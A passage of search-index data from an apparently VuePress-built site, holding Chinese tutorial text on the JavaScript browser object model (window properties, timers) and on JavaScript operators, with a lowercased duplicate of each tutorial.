屏幕宽度(分辨率)          只读     全部\nscreen.height   屏幕高度(分辨率)          只读     全部\ntop             返回窗口体系中的最顶层窗口的引用   只读     全部\n\n> window.top :返回最顶层的窗口对象，当在处理子框架时(iframes)，而想获取顶层框架时，这时可使用window.top\n\n> 兼容获取滚动条距离\n\nvar x = (window.pageXOffset !== undefined) ? window.pageXOffset : (document.documentElement || document.body.parentNode || document.body).scrollLeft;\n\nvar y = (window.pageYOffset !== undefined) ? window.pageYOffset : (document.documentElement || document.body.parentNode || document.body).scrollTop;\n\n\n\n# window对象方法\n\n属性         参数          返回值              功能                        兼容性\nalert      string      undefined        弹出带有一段消息和一个确认按钮的警告框       全部\nconfirm    string      boolean          弹出带有一段消息以及确认按钮和取消按钮的对话框   全部\nprompt     string      undefined        弹出可提示用户输入的对话框             全部\nopen       url         新窗口的window对象引用   通过脚本打开新的窗口                全部\nclose      无           undefined        关闭当前浏览器窗口                 全部\nscrollBy   xpos,ypos   undefined        在窗口中按指定的偏移量滚动文档           全部\nscrollTo   xpos,ypos   undefined        在窗口中将文档滚动到指定位置            全部\n\n使用 window.close() 方法关闭使用 window.open() 打开的窗口\n\n//全局变量,存储将要打开的窗口的对象引用.\nvar openedWindow;\n\nfunction openWindow()\n{\n  openedWindow = window.open('https://www.baidu.com');\n}\nfunction closeOpenedWindow()\n{\n  openedWindow.close();\n}\n\n\n属性              参数                          返回值                 功能               兼容性\nsetInterval     callback,time(ms)[,param]   该时间函数的id值，可用于取消执行   按照指定时间间隔执行回调函数   全部(IE9及一下版本不支持该第三个参数)\nclearInterval   name                        undefined           清除指定时间函数进程       全部\nsetTimeout      callback,time(ms)[,param]   该时间函数的id值，可用于取消执行   在指定的时间后执行回调函数    全部\nclearTimeout    name                        undefined           清除指定的延时函数进程      全部\n\nsetInterval 与 clearTimeout参数分别是\n\n 1. callback： 必填。 函数，代表指定时间后执行该段代码\n 2. time： 必填。 时间间隔，以毫秒计，不写单位\n 3. param： 可选。传给执行函数的其他参数，多个参数以,隔开(IE9 及其更早版本不支持该参数)\n\ncallback回调函数可直接写到 setInterval 和 setTimeout 参数中，也可只写一个函数名:\n\nsetInterval(run,1000)\nfunction run(){\n    console.log(1)\n}\n\n// 上下相同\n\nsetInterval(function run(){\n    console.log(1)\n},1000)\n\n\n案例： 输出1-10，每秒输出一次\n\nvar i = 1;\nvar t = setInterval(function(){\n    console.log(i)\n    i++\n    if(i>10){\n        clearInterval(t)\n    }\n},1000)\n\n\n\n\n# 特殊\n\n * ES5中，顶层对象的属性与全局变量是等价的（相当于声明全局变量、全局函数其实就是将该变量、该函数赋值给了window）。\n   \n   window.a = 1;\n   console.log(a) // 1\n   a = 2;\n   console.log(window.a) // 2\n   \n   \n   上面代码中，顶层对象的属性赋值与全局变量的赋值，是同一件事。\n\n * ES6中，全局变量将逐步与顶层对象的属性脱钩。\n   \n   var a = 1;\n   console.log(window.a) // 1\n   let b = 1;\n   console.log(window.b) // undefined\n   \n   \n   上面代码中，全局变量a由var命令声明，所以它是顶层对象的属性；全局变量b由let命令声明，所以它不是顶层对象的属性，返回undefined。",normalizedContent:"# bom\n\n> bom(browser object model) 浏览器对象模型\n\n> ecmascript提供核心语言功能，例如变量分支循环等功能 而bom提供与浏览器交互的方法和接口，使用bom可以访问和操作浏览器窗口，可以控制浏览器显示的页面以外的部分\n\nbom由一系列相关的对象构成，并且每个对象都提供了很多方法与属性，由于bom主要用于管理窗口与窗口之间的通讯，因此其核心对象是window；\n\n\n# window对象\n\n\n# window对象属性\n\n属性              描述                 可读写性   兼容性\ninnerwidth      浏览器窗口宽度            只读     >ie8\ninnerheight     浏览器窗口高度            只读     >ie8\nscreen.width    屏幕宽度(分辨率)          只读     全部\nscreen.height   屏幕高度(分辨率)          只读     全部\ntop             返回窗口体系中的最顶层窗口的引用   只读     全部\n\n> window.top :返回最顶层的窗口对象，当在处理子框架时(iframes)，而想获取顶层框架时，这时可使用window.top\n\n> 兼容获取滚动条距离\n\nvar x = (window.pagexoffset !== undefined) ? window.pagexoffset : (document.documentelement || document.body.parentnode || document.body).scrollleft;\n\nvar y = (window.pageyoffset !== undefined) ? window.pageyoffset : (document.documentelement || document.body.parentnode || document.body).scrolltop;\n\n\n\n# window对象方法\n\n属性         参数          返回值              功能                        兼容性\nalert      string      undefined        弹出带有一段消息和一个确认按钮的警告框       全部\nconfirm    string      boolean          弹出带有一段消息以及确认按钮和取消按钮的对话框   全部\nprompt     string      undefined        弹出可提示用户输入的对话框             全部\nopen       url         新窗口的window对象引用   通过脚本打开新的窗口                全部\nclose      无           undefined        关闭当前浏览器窗口                 全部\nscrollby   xpos,ypos   undefined        在窗口中按指定的偏移量滚动文档           全部\nscrollto   xpos,ypos   undefined        在窗口中将文档滚动到指定位置            全部\n\n使用 window.close() 方法关闭使用 window.open() 打开的窗口\n\n//全局变量,存储将要打开的窗口的对象引用.\nvar openedwindow;\n\nfunction openwindow()\n{\n  openedwindow = window.open('https://www.baidu.com');\n}\nfunction closeopenedwindow()\n{\n  openedwindow.close();\n}\n\n\n属性              参数                          返回值                 功能               兼容性\nsetinterval     callback,time(ms)[,param]   该时间函数的id值，可用于取消执行   按照指定时间间隔执行回调函数   全部(ie9及一下版本不支持该第三个参数)\nclearinterval   name                        undefined           清除指定时间函数进程       全部\nsettimeout      callback,time(ms)[,param]   该时间函数的id值，可用于取消执行   在指定的时间后执行回调函数    全部\ncleartimeout    name                        undefined           清除指定的延时函数进程      全部\n\nsetinterval 与 cleartimeout参数分别是\n\n 1. callback： 必填。 函数，代表指定时间后执行该段代码\n 2. time： 必填。 时间间隔，以毫秒计，不写单位\n 3. param： 可选。传给执行函数的其他参数，多个参数以,隔开(ie9 及其更早版本不支持该参数)\n\ncallback回调函数可直接写到 setinterval 和 settimeout 参数中，也可只写一个函数名:\n\nsetinterval(run,1000)\nfunction run(){\n    console.log(1)\n}\n\n// 上下相同\n\nsetinterval(function run(){\n    console.log(1)\n},1000)\n\n\n案例： 输出1-10，每秒输出一次\n\nvar i = 1;\nvar t = setinterval(function(){\n    console.log(i)\n    i++\n    if(i>10){\n        clearinterval(t)\n    }\n},1000)\n\n\n\n\n# 特殊\n\n * es5中，顶层对象的属性与全局变量是等价的（相当于声明全局变量、全局函数其实就是将该变量、该函数赋值给了window）。\n   \n   window.a = 1;\n   console.log(a) // 1\n   a = 2;\n   console.log(window.a) // 2\n   \n   \n   上面代码中，顶层对象的属性赋值与全局变量的赋值，是同一件事。\n\n * es6中，全局变量将逐步与顶层对象的属性脱钩。\n   \n   var a = 1;\n   console.log(window.a) // 1\n   let b = 1;\n   console.log(window.b) // undefined\n   \n   \n   上面代码中，全局变量a由var命令声明，所以它是顶层对象的属性；全局变量b由let命令声明，所以它不是顶层对象的属性，返回undefined。",charsets:{cjk:!0}},{title:"运算符",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/03-%E8%BF%90%E7%AE%97%E7%AC%A6.html",relativePath:"Javascript/Javascript基础语法/03-运算符.md",key:"v-1fd2367a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/03-%E8%BF%90%E7%AE%97%E7%AC%A6.html",headers:[{level:2,title:"算数运算符",slug:"算数运算符",normalizedTitle:"算数运算符",charIndex:181},{level:3,title:"加法(+)",slug:"加法",normalizedTitle:"加法(+)",charIndex:258},{level:3,title:"减法(-)",slug:"减法",normalizedTitle:"减法(-)",charIndex:1119},{level:3,title:"乘法运算",slug:"乘法运算",normalizedTitle:"乘法运算",charIndex:1373},{level:3,title:"除法运算",slug:"除法运算",normalizedTitle:"除法运算",charIndex:1597},{level:3,title:"取余(%)",slug:"取余",normalizedTitle:"取余(%)",charIndex:227},{level:3,title:"++ 自加 -- 自减",slug:"自加-自减",normalizedTitle:"++ 自加 -- 自减",charIndex:2121},{level:3,title:"求幂运算符",slug:"求幂运算符",normalizedTitle:"求幂运算符",charIndex:2349},{level:2,title:"关系(比较)运算符",slug:"关系-比较-运算符",normalizedTitle:"关系(比较)运算符",charIndex:78},{level:3,title:"比较规则",slug:"比较规则",normalizedTitle:"比较规则",charIndex:2549},{level:2,title:"赋值运算符",slug:"赋值运算符",normalizedTitle:"赋值运算符",charIndex:91},{level:2,title:"逻辑运算符",slug:"逻辑运算符",normalizedTitle:"逻辑运算符",charIndex:100},{level:2,title:"一元运算符",slug:"一元运算符",normalizedTitle:"一元运算符",charIndex:109},{level:2,title:"三元运算符",slug:"三元运算符",normalizedTitle:"三元运算符",charIndex:118},{level:3,title:"三元运算符使用技巧",slug:"三元运算符使用技巧",normalizedTitle:"三元运算符使用技巧",charIndex:4130},{level:2,title:"特殊运算符",slug:"特殊运算符",normalizedTitle:"特殊运算符",charIndex:127},{level:2,title:"指数运算符",slug:"指数运算符",normalizedTitle:"指数运算符",charIndex:136},{level:2,title:"链判断运算符 ?.",slug:"链判断运算符",normalizedTitle:"链判断运算符 ?.",charIndex:4775},{level:2,title:'Null 判断运算符 ??<Badge text="ES2020 " type="warning"/>',slug:"null-判断运算符",normalizedTitle:'null 判断运算符 ??<badge text="es2020 " type="warning"/>',charIndex:null},{level:2,title:"逻辑赋值运算符",slug:"逻辑赋值运算符",normalizedTitle:"逻辑赋值运算符",charIndex:169},{level:2,title:"运算符的优先级",slug:"运算符的优先级",normalizedTitle:"运算符的优先级",charIndex:6722}],headersStr:'算数运算符 加法(+) 减法(-) 乘法运算 除法运算 取余(%) ++ 自加 -- 自减 求幂运算符 关系(比较)运算符 比较规则 赋值运算符 逻辑运算符 一元运算符 三元运算符 三元运算符使用技巧 特殊运算符 指数运算符 链判断运算符 ?. Null 判断运算符 ??<Badge text="ES2020 " type="warning"/> 逻辑赋值运算符 运算符的优先级',content:"# 运算符\n\n> 运算符用于执行程序代码运算，会针对一个或以上操作数项目来进行运算。\n\nJavaScript中的运算符主要分为:\n\n * 算术运算符\n * 关系(比较)运算符\n * 赋值运算符\n * 逻辑运算符\n * 一元运算符\n * 三元运算符\n * 特殊运算符\n * 指数运算符\n * 链判断运算符\n * Null 判断运算符\n * 逻辑赋值运算符\n\n\n# 算数运算符\n\nJavaScript中的算术运算符中有加(+)、减(-)、乘(*)、除(/)、取余(%)、自增(++)、自减(--)、求幂(**)\n\n\n# 加法(+)\n\nJavaScript中的+主要用于两个方面，一个是加法运算，另一个是用来进行字符串拼接，加法运算规则如下：\n\n 1. 数字与除字符串以外类型相加： 将其他类型转化为数字后算术相加，无法转化则结果为NaN\n    * true 转化为1\n    * false、null转化为0\n    * undefined 无法转化\n 2. NaN与除字符串以外类型相加结果都为NaN\n 3. 字符串与任意类型相加： 拼接\n    \n    1+false    //1\n    '1'+1      //'11'\n    NaN+'1'     //'NaN1'\n    [1,2,3]+1    //\"1,2,31\"\n    {a:2}+'1'    // 1\n    \n\n在开发中，我们经常需要将变量的值输出到某个字符串中，这时需要将变量与字符串进行拼接，字符串拼接有两种方式：\n\n# 1. + 拼接\n\n变量必须放到字符串引号外部，变量与字符串之间用+连接：\n\nvar name = \"张三\", age = 20, sex = \"男\";\nalert( name + \"的年龄是:\" +age+ \"，性别是:\" +sex )\n\n\n# 2. es6模板字符串 (ie不支持)\n\n> 传统+拼接字符串相当繁琐不方便，ES6 引入了模板字符串解决这个问题\n\n模板字符串用 反单引号(`) 标识，可以当作普通字符串使用，或者在字符串中嵌入变量:\n\nvar name = \"张三\", age = 20, sex = \"男\";\nalert( `${name}的年龄是:${age}，性别是:${sex}` )\n\n\n模板字符串特点：\n\n1. 模板字符串中嵌入变量，需要将变量名写在`${}`之中，变量与字符串不需要 `+`连接\n2. `${}` 中可以放入任意的 JavaScript 表达式，可以进行运算，以及引用对象属性： `${num + 1}`\n3. 模板字符串中可以换行\n4. 模板字符串中可以随意使用单双引号\n\n\n\n# 减法(-)\n\n 1. 数字和字符串相减 :\n    * 字符串全部由数字组成，将字符串转化为数字，再相减\n    * 字符串不能转化为数字，结束是 NaN\n    * null转化为0 undefined转化为NaN true为1 false为0\n 2. 字符串和字符串相减 : 和数字和字符串相减规则相同\n\n'11a'-1    //NaN\n'11'-1     //10\n\n\n# 加减法做数字与字符串的转换\n\n * 数字转化为字符串: num + \"\"\n * 字符串转化为数字: num - 0\n\n\n# 乘法运算\n\n 1. 数字与字符串运算：\n    * 将字符串尝试着转化为数字，进行运算\n    * 字符串不能转化为数字，结果是 NaN\n 2. null转化为0 true为1 false为0 空字符串转为0\n 3. Undefined乘所有数据类型的都为NaN\n 4. 字符串和字符串运算 : 和数字和字符串运算规则相同\n\ntrue*null      //0\n'11'*'11'    // 121\n'1a'*22    //NaN\n\n\n\n# 除法运算\n\n 1. 字符串类型 数字类型与 null 相除 结果为 Infinity\n 2. 字符串类型、数字类型 null与 Undefined 相除 结果为 NaN\n 3. 字符串类型 数字类型 null与 字符串类型、数字类型 null相除进行相应转换做除法运算\n    * 字符串不能转为数字则结果为NaN\n    * 空字符串转为0\n\n11/null              //Infinity\n'11'/'11'            // 1\n'11a'/'11'            // NaN\n\n\n\n# 取余(%)\n\n取余，即取余数，如 10 % 3 则指 10除以3的余数\n\n> 用于取一段范围的值\n> 一般不用于小数，因为结果不确定（不精确）。\n\n 1. Undefined 与所有数据类型的 取余 都为NaN\n 2. 其余数据类型先进行转换，能转为数字则进行取余运算，否则为NaN\n\n''%1        // 0\n11%0        // NaN\n11%null     // NaN\n\n\n判断数字num是否是偶数：\n\nif(num%2==0){\n    alert(num + \"是偶数\")\n}\n\n\n\n# ++ 自加 -- 自减\n\n> 规则： i++ 相当于变量i自身值变大1，类似i+=1； i--同理 ++可写在变量前或后： i++是先访问i然后再自增，而++i则是先自增然后再访问i的值\n\nvar i = 10;\nconsole.log(i++);  // 10   先输出，后自增。 console.log(i);  i++;\nconsole.log(++i);  // 11   先自增，后输出。 i++;  console.log(i);\n\n\n\n# 求幂运算符\n\n> x**y 取x的y次方，同Math.pow(x, y)\n\n3 ** 2  //9\n效果同\nMath.pow(3, 2) //9\n\n\n\n# 关系(比较)运算符\n\n比较运算符得到的结果 都是 boolean\n\n主要有以下几种比较运算符\n\n * >\n * <\n * >=\n * <=\n * == (相等)\n * != (不相等)\n * === (全等)\n * !== (不全等)\n\n\n# 比较规则\n\n 1. 将比较的对象尝试转化为数字,能转化则按照数字比较,不能转化则为false\n 2. NaN与任意数据比较结果均为 false\n 3. 字符串和字符串比较, 比较第一个字符的unicode编码值，第一个字符要是相同，就比较第二个，依次往下(ASCII码表在最末尾)\n    \n    '10000' < '2'   //1的unicode值比2的unicode值小  true       \n    '10000' > 2    //转成数字比较  true\n    \n\n 4. ==和全等===的区别\n    * ==是只比较两边的值(如果两边类型不相同，则先尝试着转化，然后再比较，所以耗时比===多)\n      * 0==undefined (false)\n      * 0==null (false)\n      * NaN == NaN (false)\n      * undefined==null (true)\n    * ===比较两边的值和类型，都相等才返回true；\n 5. === 和 object.js()的区别\n\nObject.is(+0,-0);               //false\n+0===-0                         //true\nObject.is(NaN,NaN);             //true\nNaN===NaN                       //false\n\n\n\n# 赋值运算符\n\n> =、+=、-=、*=、/=、%=、**= 运算符右边的值赋给左边的变量\n\n运算符   实例      等价于\n=     a=25    a=25\n+=    a+=25   a=a+25\n-=    a-=25   a=a-25\n*=    a*=25   a=a*25\n/=    a/=25   a=a/25\n%=    a%=25   a=a%25\n**=   a**=3   a=a^3\n\n\n# 逻辑运算符\n\n> 在JavaScript逻辑运算中，0、\"\"、null、false、undefined、NaN都会判为false，其他都为true\n\n 1. 与 &&\n    * 只要有一个是假，结果就是假\n    * &&左侧是真，结果取右侧； 左侧假，结果取左侧值\n 2. 或 ||\n    * 只要有一个是真，结果就是真\n    * ||左侧是真，结果取左侧； 左侧假，结果取右侧值\n 3. 非 !\n    * 取反\n    * 结果是boolean值\n\n总结： 与或运算，哪一侧能决定表达式真假性，则结果取哪一侧。\n\n例:\n\n0 && 1    // 0     \n0 || 1    // 1\n\n1 && 2     // 2\n1 || 2     // 1\n\n!1     // false\n!0     // true\n\n\n# 逻辑运算符的应用：短路原则\n\n> 与或运算左侧结果已经确定整个表达式真假性，则右侧不再计算\n\n * &&与运算：左侧是假，右侧不进行计算\n * ||或运算：左侧是真，右侧不进行计算\n\n\n# 一元运算符\n\n只能操作一个值的操作符就叫做一元操作符\n\n * new (创建对象) delete (删除对象上的内容)\n * typeof -(负号) +(正号)\n * instanceof (判断对象是否由一个构造函数实例化)\n\n\n# 三元运算符\n\n> 基于某些条件对变量进行赋值的条件运算符，\n\nvar iablename=(condition)?value1:value2   \n\n\ncondition为true则variablename取:前的值，也就是value1，否则取:后的值，也就是value2\n\n\n# 三元运算符使用技巧\n\n 1. 可以简化条件判断\n\nvar fee;\nif(isMember){\n    fee=\"￥2.00\";\n}else{\n    fee=\"￥10.00\";\n}\nfee=isMember ? \"￥2.00\" : \"￥10.00\";\n\n\n 2. 三元运算符用来执行多个操作,用小括号包裹，再用逗号隔开语句。\n\n\n# 特殊运算符\n\n * , 逗号 —— 分隔数据\n\nvar num1 = 1, num = 2, num3 = 3;\n\n\n * () 小括号运算符 —— 提升算术优先级\n\nvar i = 1 + 3 * 5;\nconsole.log(i);   // 16\nvar l = (1 + 3) * 5;\nconsole.log(l);   // 20\n\n\n\n# 指数运算符\n\n> ES2016 新增了一个指数运算符（**）。\n\n2 ** 2 // 4\n2 ** 3 // 8\n\n\n这个运算符的一个特点是右结合，而不是常见的左结合。多个指数运算符连用时，是从最右边开始计算的。\n\n// 相当于 2 ** (3 ** 2)\n2 ** 3 ** 2\n// 512\n\n\n上面代码中，首先计算的是第二个指数运算符，而不是第一个。\n\n指数运算符可以与等号结合，形成一个新的赋值运算符（**=）。\n\nlet a = 1.5;\na **= 2;\n// 等同于 a = a * a;\n\nlet b = 4;\nb **= 3;\n// 等同于 b = b * b * b;\n\n\n\n# 链判断运算符 ?.\n\n编程实务中，如果读取对象内部的某个属性，往往需要判断一下，属性的上层对象是否存在。比如，读取message.body.user.firstName这个属性，安全的写法是写成下面这样。\n\n// 错误的写法\nconst  firstName = message.body.user.firstName || 'default';\n\n// 正确的写法\nconst firstName = (message\n  && message.body\n  && message.body.user\n  && message.body.user.firstName) || 'default';\n\n\n简化的写法\n\nconst firstName = message?.body?.user?.firstName || 'default';\nconst fooValue = myForm.querySelector('input[name=foo]')?.value\n\n\n?.运算符，直接在链式调用的时候判断，左侧的对象是否为null或undefined。如果是的，就不再往下运算，而是返回undefined\n\n// 下面是判断对象方法是否存在，如果存在就立即执行的例子。\niterator.return?.()\n\n\n\n# Null 判断运算符 ??\n\n读取对象属性的时候，如果某个属性的值是null或undefined，有时候需要为它们指定默认值。常见做法是通过||运算符指定默认值。\n\n只要属性的值为null或undefined，默认值就会生效，但是属性的值如果为空字符串或false或0，默认值也会生效\n\nconst headerText = response.settings.headerText || 'Hello, world!';\nconst animationDuration = response.settings.animationDuration || 300;\nconst showSplashScreen = response.settings.showSplashScreen || true;\n\n\nNull 判断运算符??。它的行为类似||，但是只有运算符左侧的值为null或undefined时，才会返回右侧的值。\n\nconst headerText = response.settings.headerText ?? 'Hello, world!';\nconst animationDuration = response.settings.animationDuration ?? 300;\nconst showSplashScreen = response.settings.showSplashScreen ?? true;\n\n\n跟链判断运算符?.配合使用，为null或undefined的值设置默认值。\n\nconst animationDuration = response.settings?.animationDuration ?? 300;\n\n\n多个逻辑运算符一起使用，必须用括号表明优先级，否则会报错。\n\n// 报错\nlhs && middle ?? rhs\nlhs ?? middle && rhs\nlhs || middle ?? rhs\nlhs ?? middle || rhs\n\n\n\n# 逻辑赋值运算符\n\n> ES2021 引入了三个新的逻辑赋值运算符（logical assignment operators），将逻辑运算符与赋值运算符进行结合。\n\n// 或赋值运算符\nx ||= y\n// 等同于\nx || (x = y)\n\n// 与赋值运算符\nx &&= y\n// 等同于\nx && (x = y)\n\n// Null 赋值运算符\nx ??= y\n// 等同于\nx ?? (x = y)\n// 这三个运算符||=、&&=、??=相当于先进行逻辑运算，然后根据运算结果，再视情况进行赋值运算。\n\n\n它们的一个用途是，为变量或属性设置默认值。\n\n// 老的写法\nuser.id = user.id || 1;\n\n// 新的写法\nuser.id ||= 1;\n\n// 老的写法\nfunction example(opts) {\n  opts.foo = opts.foo ?? 'bar';\n  opts.baz ?? (opts.baz = 'qux');\n}\n\n// 新的写法\nfunction example(opts) {\n  opts.foo ??= 'bar';\n  opts.baz ??= 'qux';\n}\n\n\n\n# 运算符的优先级\n\n> 下表中的运算符按从最高到最低的优先级列出。具有相同优先级的运算符按从左至右的顺序求值。\n\n运算符                                                运算符类型\n(…)                                                圆括号\n….…, …[…] ,new…(…),…(…)                            成员访问,需计算的成员访问,new(带参数列表),函数调用\nnew …                                              new(无参数列表)\n…++, …--                                           后置递增(运算符在后) 后置递减(运算符在后)\n!…,~…,+…,-…,++…,--…,typeof…,void…,delete…,await…   逻辑非 按位非 一元加法 一元减法 前置递增 前置递减 typeof void delete await\n…**…                                               幂\n…*… …/… …%…                                        乘法 除法 取余\n+ -                                                加法 减法\n< <= > >= in instanceof                            小于 小于等于 大于 大于等于 in 判断是否为这个构造函数实例化\n== != === !==                                      等号 非等 全等 非全等\n&&                                                 逻辑与\n¦¦                                                 逻辑或\n… ? … : …                                          三元运算符\n= += -= *= /= %= **=                               赋值\n,                                                  逗号\n\n",normalizedContent:"# 运算符\n\n> 运算符用于执行程序代码运算，会针对一个或以上操作数项目来进行运算。\n\njavascript中的运算符主要分为:\n\n * 算术运算符\n * 关系(比较)运算符\n * 赋值运算符\n * 逻辑运算符\n * 一元运算符\n * 三元运算符\n * 特殊运算符\n * 指数运算符\n * 链判断运算符\n * null 判断运算符\n * 逻辑赋值运算符\n\n\n# 算数运算符\n\njavascript中的算术运算符中有加(+)、减(-)、乘(*)、除(/)、取余(%)、自增(++)、自减(--)、求幂(**)\n\n\n# 加法(+)\n\njavascript中的+主要用于两个方面，一个是加法运算，另一个是用来进行字符串拼接，加法运算规则如下：\n\n 1. 数字与除字符串以外类型相加： 将其他类型转化为数字后算术相加，无法转化则结果为nan\n    * true 转化为1\n    * false、null转化为0\n    * undefined 无法转化\n 2. nan与除字符串以外类型相加结果都为nan\n 3. 字符串与任意类型相加： 拼接\n    \n    1+false    //1\n    '1'+1      //'11'\n    nan+'1'     //'nan1'\n    [1,2,3]+1    //\"1,2,31\"\n    {a:2}+'1'    // 1\n    \n\n在开发中，我们经常需要将变量的值输出到某个字符串中，这时需要将变量与字符串进行拼接，字符串拼接有两种方式：\n\n# 1. + 拼接\n\n变量必须放到字符串引号外部，变量与字符串之间用+连接：\n\nvar name = \"张三\", age = 20, sex = \"男\";\nalert( name + \"的年龄是:\" +age+ \"，性别是:\" +sex )\n\n\n# 2. es6模板字符串 (ie不支持)\n\n> 传统+拼接字符串相当繁琐不方便，es6 引入了模板字符串解决这个问题\n\n模板字符串用 反单引号(`) 标识，可以当作普通字符串使用，或者在字符串中嵌入变量:\n\nvar name = \"张三\", age = 20, sex = \"男\";\nalert( `${name}的年龄是:${age}，性别是:${sex}` )\n\n\n模板字符串特点：\n\n1. 模板字符串中嵌入变量，需要将变量名写在`${}`之中，变量与字符串不需要 `+`连接\n2. `${}` 中可以放入任意的 javascript 表达式，可以进行运算，以及引用对象属性： `${num + 1}`\n3. 模板字符串中可以换行\n4. 模板字符串中可以随意使用单双引号\n\n\n\n# 减法(-)\n\n 1. 数字和字符串相减 :\n    * 字符串全部由数字组成，将字符串转化为数字，再相减\n    * 字符串不能转化为数字，结束是 nan\n    * null转化为0 undefined转化为nan true为1 false为0\n 2. 字符串和字符串相减 : 和数字和字符串相减规则相同\n\n'11a'-1    //nan\n'11'-1     //10\n\n\n# 加减法做数字与字符串的转换\n\n * 数字转化为字符串: num + \"\"\n * 字符串转化为数字: num - 0\n\n\n# 乘法运算\n\n 1. 数字与字符串运算：\n    * 将字符串尝试着转化为数字，进行运算\n    * 字符串不能转化为数字，结果是 nan\n 2. null转化为0 true为1 false为0 空字符串转为0\n 3. undefined乘所有数据类型的都为nan\n 4. 字符串和字符串运算 : 和数字和字符串运算规则相同\n\ntrue*null      //0\n'11'*'11'    // 121\n'1a'*22    //nan\n\n\n\n# 除法运算\n\n 1. 字符串类型 数字类型与 null 相除 结果为 infinity\n 2. 字符串类型、数字类型 null与 undefined 相除 结果为 nan\n 3. 字符串类型 数字类型 null与 字符串类型、数字类型 null相除进行相应转换做除法运算\n    * 字符串不能转为数字则结果为nan\n    * 空字符串转为0\n\n11/null              //infinity\n'11'/'11'            // 1\n'11a'/'11'            // nan\n\n\n\n# 取余(%)\n\n取余，即取余数，如 10 % 3 则指 10除以3的余数\n\n> 用于取一段范围的值\n> 一般不用于小数，因为结果不确定（不精确）。\n\n 1. undefined 与所有数据类型的 取余 都为nan\n 2. 其余数据类型先进行转换，能转为数字则进行取余运算，否则为nan\n\n''%1        // 0\n11%0        // nan\n11%null     // nan\n\n\n判断数字num是否是偶数：\n\nif(num%2==0){\n    alert(num + \"是偶数\")\n}\n\n\n\n# ++ 自加 -- 自减\n\n> 规则： i++ 相当于变量i自身值变大1，类似i+=1； i--同理 ++可写在变量前或后： i++是先访问i然后再自增，而++i则是先自增然后再访问i的值\n\nvar i = 10;\nconsole.log(i++);  // 10   先输出，后自增。 console.log(i);  i++;\nconsole.log(++i);  // 11   先自增，后输出。 i++;  console.log(i);\n\n\n\n# 求幂运算符\n\n> x**y 取x的y次方，同math.pow(x, y)\n\n3 ** 2  //9\n效果同\nmath.pow(3, 2) //9\n\n\n\n# 关系(比较)运算符\n\n比较运算符得到的结果 都是 boolean\n\n主要有以下几种比较运算符\n\n * >\n * <\n * >=\n * <=\n * == (相等)\n * != (不相等)\n * === (全等)\n * !== (不全等)\n\n\n# 比较规则\n\n 1. 将比较的对象尝试转化为数字,能转化则按照数字比较,不能转化则为false\n 2. nan与任意数据比较结果均为 false\n 3. 字符串和字符串比较, 比较第一个字符的unicode编码值，第一个字符要是相同，就比较第二个，依次往下(ascii码表在最末尾)\n    \n    '10000' < '2'   //1的unicode值比2的unicode值小  true       \n    '10000' > 2    //转成数字比较  true\n    \n\n 4. ==和全等===的区别\n    * ==是只比较两边的值(如果两边类型不相同，则先尝试着转化，然后再比较，所以耗时比===多)\n      * 0==undefined (false)\n      * 0==null (false)\n      * nan == nan (false)\n      * undefined==null (true)\n    * ===比较两边的值和类型，都相等才返回true；\n 5. === 和 object.js()的区别\n\nobject.is(+0,-0);               //false\n+0===-0                         //true\nobject.is(nan,nan);             //true\nnan===nan                       //false\n\n\n\n# 赋值运算符\n\n> =、+=、-=、*=、/=、%=、**= 运算符右边的值赋给左边的变量\n\n运算符   实例      等价于\n=     a=25    a=25\n+=    a+=25   a=a+25\n-=    a-=25   a=a-25\n*=    a*=25   a=a*25\n/=    a/=25   a=a/25\n%=    a%=25   a=a%25\n**=   a**=3   a=a^3\n\n\n# 逻辑运算符\n\n> 在javascript逻辑运算中，0、\"\"、null、false、undefined、nan都会判为false，其他都为true\n\n 1. 与 &&\n    * 只要有一个是假，结果就是假\n    * &&左侧是真，结果取右侧； 左侧假，结果取左侧值\n 2. 或 ||\n    * 只要有一个是真，结果就是真\n    * ||左侧是真，结果取左侧； 左侧假，结果取右侧值\n 3. 非 !\n    * 取反\n    * 结果是boolean值\n\n总结： 与或运算，哪一侧能决定表达式真假性，则结果取哪一侧。\n\n例:\n\n0 && 1    // 0     \n0 || 1    // 1\n\n1 && 2     // 2\n1 || 2     // 1\n\n!1     // false\n!0     // true\n\n\n# 逻辑运算符的应用：短路原则\n\n> 与或运算左侧结果已经确定整个表达式真假性，则右侧不再计算\n\n * &&与运算：左侧是假，右侧不进行计算\n * ||或运算：左侧是真，右侧不进行计算\n\n\n# 一元运算符\n\n只能操作一个值的操作符就叫做一元操作符\n\n * new (创建对象) delete (删除对象上的内容)\n * typeof -(负号) +(正号)\n * instanceof (判断对象是否由一个构造函数实例化)\n\n\n# 三元运算符\n\n> 基于某些条件对变量进行赋值的条件运算符，\n\nvar iablename=(condition)?value1:value2   \n\n\ncondition为true则variablename取:前的值，也就是value1，否则取:后的值，也就是value2\n\n\n# 三元运算符使用技巧\n\n 1. 可以简化条件判断\n\nvar fee;\nif(ismember){\n    fee=\"￥2.00\";\n}else{\n    fee=\"￥10.00\";\n}\nfee=ismember ? \"￥2.00\" : \"￥10.00\";\n\n\n 2. 三元运算符用来执行多个操作,用小括号包裹，再用逗号隔开语句。\n\n\n# 特殊运算符\n\n * , 逗号 —— 分隔数据\n\nvar num1 = 1, num = 2, num3 = 3;\n\n\n * () 小括号运算符 —— 提升算术优先级\n\nvar i = 1 + 3 * 5;\nconsole.log(i);   // 16\nvar l = (1 + 3) * 5;\nconsole.log(l);   // 20\n\n\n\n# 指数运算符\n\n> es2016 新增了一个指数运算符（**）。\n\n2 ** 2 // 4\n2 ** 3 // 8\n\n\n这个运算符的一个特点是右结合，而不是常见的左结合。多个指数运算符连用时，是从最右边开始计算的。\n\n// 相当于 2 ** (3 ** 2)\n2 ** 3 ** 2\n// 512\n\n\n上面代码中，首先计算的是第二个指数运算符，而不是第一个。\n\n指数运算符可以与等号结合，形成一个新的赋值运算符（**=）。\n\nlet a = 1.5;\na **= 2;\n// 等同于 a = a * a;\n\nlet b = 4;\nb **= 3;\n// 等同于 b = b * b * b;\n\n\n\n# 链判断运算符 ?.\n\n编程实务中，如果读取对象内部的某个属性，往往需要判断一下，属性的上层对象是否存在。比如，读取message.body.user.firstname这个属性，安全的写法是写成下面这样。\n\n// 错误的写法\nconst  firstname = message.body.user.firstname || 'default';\n\n// 正确的写法\nconst firstname = (message\n  && message.body\n  && message.body.user\n  && message.body.user.firstname) || 'default';\n\n\n简化的写法\n\nconst firstname = 